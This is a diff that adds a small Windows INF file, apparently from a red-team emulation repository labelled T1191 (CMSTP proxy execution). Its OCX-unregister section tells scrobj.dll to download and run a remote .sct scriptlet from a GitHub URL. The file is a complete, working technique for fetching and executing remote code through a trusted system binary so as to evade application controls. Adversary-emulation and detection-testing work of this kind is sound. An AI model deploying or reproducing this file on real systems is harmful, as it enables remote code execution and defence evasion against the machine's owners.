@@ -1,0 +1,14 @@
+[version]
+Signature=$chicago$
+AdvancedINF=2.5
+
+[DefaultInstall_SingleUser]
+UnRegisterOCXs=UnRegisterOCXSection
+
+[UnRegisterOCXSection]
+%11%\scrobj.dll,NI,https://github.com/brianwrf/RTEmulation/raw/master/Techniques/T1191/T1191.sct
+
+[Strings]
+AppAct = "SOFTWARE\Microsoft\Connection Manager"
+ServiceName="T1191"
+ShortSvcName="T1191"
